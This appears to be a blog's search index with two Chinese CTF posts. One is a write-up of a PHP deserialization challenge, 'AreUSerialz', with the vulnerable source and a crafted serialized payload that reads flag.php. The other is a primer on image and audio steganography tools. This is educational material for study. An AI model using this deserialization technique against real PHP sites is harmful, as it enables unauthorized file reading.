<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/2022/04/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/04/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>序列化(serialize)就是将对象转换为字符串。反序列化(unserialize)则相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>PHP 对属性或方法的<strong>访问控制</strong>，是通过在前面添加<strong>关键字</strong> public（公有），protected（受保护）或 private（私有）来实现的。<br>public（公有）：公有的类成员可以在<strong>任何地方被访问</strong>。<br>protected（受保护）：受保护的类成员则可以<strong>被其自身以及其子类和父类访问</strong>。<br>private（私有）：私有的类成员则<strong>只能被其定义所在的类访问</strong>。</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>有类时会触发 <strong>魔术方法</strong></p><p>那什么时魔术方法呢？PHP中把两个下划线开头的方法称为魔术方法(Magic methods)</p><p>serialize() 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作。</p><p><strong>魔术方法</strong>包括：</p><table><thead><tr><th>魔术方法</th><th>用处</th></tr></thead><tbody><tr><td>__construct()</td><td>实例化类时自动调用</td></tr><tr><td>__destruct()</td><td>类对象使用结束时自动调用</td></tr><tr><td>__set()</td><td>在给未定义的属性赋值时自动调用</td></tr><tr><td>__get()</td><td>调用未定义的属性时自动调用</td></tr><tr><td>__isset()</td><td>使用 isset() 或 empty() 函数时自动调用</td></tr><tr><td>__unset()</td><td>使用 unset() 时自动调用</td></tr><tr><td>__sleep()</td><td>使用 serialize 序列化时自动调用</td></tr><tr><td>__wakeup()</td><td>使用 unserialize 反序列化时自动调用</td></tr><tr><td>__call()</td><td>调用一个不存在的方法时自动调用</td></tr><tr><td>__callStatic()</td><td>调用一个不存在的静态方法时自动调用</td></tr><tr><td>__toString()</td><td>把对象转换成字符串时自动调用</td></tr><tr><td>__invoke()</td><td>当尝试把对象当方法调用时自动调用</td></tr><tr><td>__set_state()</td><td>当使用 var_export() 函数时自动调用，接受一个数组参数</td></tr><tr><td>__clone()</td><td>当使用 clone 复制一个对象时自动调用</td></tr><tr><td>__debugInfo()</td><td>使用 var_dump() 打印对象信息时自动调用</td></tr></tbody></table><p>简单的序列化：</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h1cpb3ulbkj30mz0ibjtf.jpg" alt="555"></p><p>序列化后各个字符串的含义：</p><p><img src="https://tvax4.sinaimg.cn/large/007u0ID7ly1h1cpc2mg5qj30vm0btn2n.jpg" alt="556"></p><h3 id="PHP反序列化漏洞原理"><a href="#PHP反序列化漏洞原理" class="headerlink" title="PHP反序列化漏洞原理"></a>PHP反序列化漏洞原理</h3><p>序列化和反序列化本身没有问题，但是如果<strong>反序列化的内容是用户可以控制的</strong>，且<strong>后台不正当的使用了PHP中的魔法函数</strong>，就会导致安全问题。当传给<code>unserialize()</code>的<strong>参数可控</strong>时，可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><a href="%5BCTFHub%5D(https://www.ctfhub.com/#/challenge)">CTFHub中 2020-网鼎杯-青龙组-Web-AreUSerialz</a></p><p><strong>代码审计</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>        <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>&#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br><span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>首先代码审计就是看两点，一有无漏洞，二有无可控变量。</p><p>我们发现源代码最后76行有可控变量str通过get传参，并且发现有unserialize反序列化。</p><p>我们再看到 flag.php 是在这个高亮化文件里面的，并且发现有class(类)：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> &#123;</span><br><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br></code></pre></td></tr></table></figure><p>在反序列化后，相当于重新生成了一个对像，这个对象在程序结束时 <strong>析构执行</strong>­_destruct（）&#x2F;&#x2F;第58行</p><p>如果op值为2则强制将op的值变为1，content值为空，调用<strong>process函数</strong>。&#x2F;&#x2F;第20行</p><p>如果op值为1，则进入“写”函数；如果op值为2，则进入“<strong>读”函数</strong>。</p><p>这里我们需要读取到flag.php中的答案所以需要调用“读”函数&#x2F;&#x2F;第45行</p><p>如果filename有值，则file_get_contents()函数把整个文件读入一个字符串中,如果给filename赋值为flag.php 那么我们就能读出flag了。</p><p>但是在destruct函数中进行了判断把2强制转换成了1：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function __destruct() &#123;<br>    <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>        $<span class="hljs-keyword">this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    $<span class="hljs-keyword">this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    $<span class="hljs-keyword">this</span>-&gt;process();<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们这里需要知道，用三个等号时，除了两个变量的值相同外，还必须这两个变量的类型相同，而用两个等号时，只需要两个变量值相同。</p><p>我们构造payload时，构造op&#x3D;‘ 2’字符串，则op&#x3D;‘2’就不成立，此时op就成了我们自己设置的值。然后通过process()函数调用后：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function process() &#123;<br>    <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>        $<span class="hljs-keyword">this</span>-&gt;write();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>        $res = $<span class="hljs-keyword">this</span>-&gt;read();<br>        $<span class="hljs-keyword">this</span>-&gt;output($res);<br>    &#125;<br></code></pre></td></tr></table></figure><p>因为这里为 op &#x3D;&#x3D; “2”为弱类型对比只需要值相等就能调用“读”函数。就能读出flag.php文件了。</p><p><strong>构造payload</strong></p><p><img src="https://tva2.sinaimg.cn/large/007u0ID7ly1h1cq8e03mwj30di069tab.jpg" alt="123456789"></p><p>序列化出来的payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>FileHandler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>op%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>+<span class="hljs-number">2</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>filename%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>flag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>content%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>注意这里要把protect改为public才是公有的,并且要将FileHandler用new实例化。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-MISC基础知识之图片</title>
    <link href="/2022/04/05/CTF-MISC%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/04/05/CTF-MISC%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p><strong>MISC作为CTF中比较重要的一类题型，分值占比较大，为了帮助大家更好的学习MISC的做题方法，我总结了常见的图片类型中的几种题型及工具：</strong></p><ul><li><p>图片，音频，视频</p><blockquote><p>首先就是大家常见的图片分析，图片修复，图片修改长宽高，图片拼接，二维码扫描，LSB隐写等等。</p></blockquote><p>遇到图片类型的题，首先最基础的图片分析，将图片丢到winhex或者010editor中分析。分析此图片有无隐写信息或分析是否包含压缩包等。以下是总结的各类型文件的文件头：</p><blockquote><p>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424DC001<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>旧版office MS Word&#x2F;Excel (xls.or.doc or.ppt)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645</p><p>JPEG (jpg)，文件头：FFD8FFE1<br>&lt;.img<br>src&#x3D;”data:image…….”<br>alt&#x3D;”Base64 encoded image” &#x2F;&gt; 生成图片（常用于base64隐写图片）</p></blockquote><p>查看图片基本信息，kali下输入:</p><blockquote><p>exiftool 1.jpg</p></blockquote><p>当需要文件分离时，需要在Kali下文件分离</p><p><strong>binwalk</strong>文件分离</p><blockquote><p>binwalk -e +文件名 ||binwalk +文件名</p></blockquote><p><strong>foremost</strong>文件分离</p><blockquote><p>foremost -i +文件名</p></blockquote><p><strong>dd</strong> 文件分离 </p><p>dd命令作用是用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。</p><blockquote><p>dd if&#x3D;原文件名 of&#x3D;(要分解的文件名) skip&#x3D;5016064(十进制值) bs&#x3D;1</p></blockquote></li></ul><p>​     </p><p> 当遇到图片隐写题时，可以使用<strong>Stegsolve</strong>工具（可用于逐帧分析GIF图片，lsb隐写等）</p><p>​      使用方法如下：</p><blockquote><p>File Format:文件格式</p><p>Data Extract:数据提取</p><p>Steregram Solve:立体试图 可以左右控制偏移</p><p>Frame Browser:帧浏览器</p><p>Image Combiner:拼图，图片拼接</p></blockquote><p>  <strong>stegdetect</strong> 查询jpg图片经过哪种隐写 将图片复制到     stegdetect.exe所在目录下右键PowerShell命令</p><blockquote><p>.\stegdetect.exe -tjopi -s 10.0 .\hide.jpg</p></blockquote><p>   检测该图片用的是哪种加密方式.</p><p><strong>F5图片隐写</strong> Kali工具  点开F5-steganography文件夹 在控制端导入 输入java Extract 图片</p><p><strong>图片高宽</strong>的修改</p><p><strong>tweakpng.exe</strong>打开图片提示IDHRcyc错误，表示文件尺寸被修改，且未修改crc值</p><p><strong>outguess</strong>(关键词 猜)  </p><blockquote><p>无加密:outguess -r &#x2F;root&#x2F;angrybird.jpg -t 11.txt<br>     解密 outguess -k “my secret key” -r out.jpg hidden.txt</p></blockquote><p><strong>steghide隐写</strong> (图片或音频) Kali命令</p><blockquote><p>steghide extract -sf 文件(密码一般为空或者文件名)</p></blockquote><p><strong>题目提示NTFS</strong>  是在txt中隐藏了txt文件 cmd 输入</p><blockquote><p>notepad <em>.txt:</em>.txt</p></blockquote><p>IDAT模块很多时 用<strong>tweakpng</strong>修改 Kali中用</p><blockquote><p>pngcheck -vv 查看</p></blockquote><p><strong>JPHS隐写</strong>:(txt藏在JPG里) 打开需要提取隐藏信息的图片h.jpg 点seek输入对应密码（大多为123456）</p><p><strong>zsteg</strong>可以检测PNG和BMP图片里的隐写数据。</p><p>zsteg支持检测：<br>1：LSB steganography in PNG &amp; BMP<br>2：zlib-compressed data<br>3：OpenStego<br>4：Camouflage 1.2.1<br>5：LSB with The Eratosthenes set</p><blockquote><p>zsteg -E “extradata:0” xxxx.png &gt; flag</p></blockquote><p>**MP3stego(**音频隐写)详细看</p><p><a href="https://blog.csdn.net/myloveprogrmming/article/details/52641916">https://blog.csdn.net/myloveprogrmming/article/details/52641916</a></p><p><strong>Audacity</strong> 音频查看工具</p><p>针对音频题目的常用工具，具体使用教程见</p><p><a href="http://www.360doc.com/content/13/0620/17/1437142_294320939.shtml">http://www.360doc.com/content/13/0620/17/1437142_294320939.shtml</a></p><p>时间有限，有空的时候还会继续补充。</p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
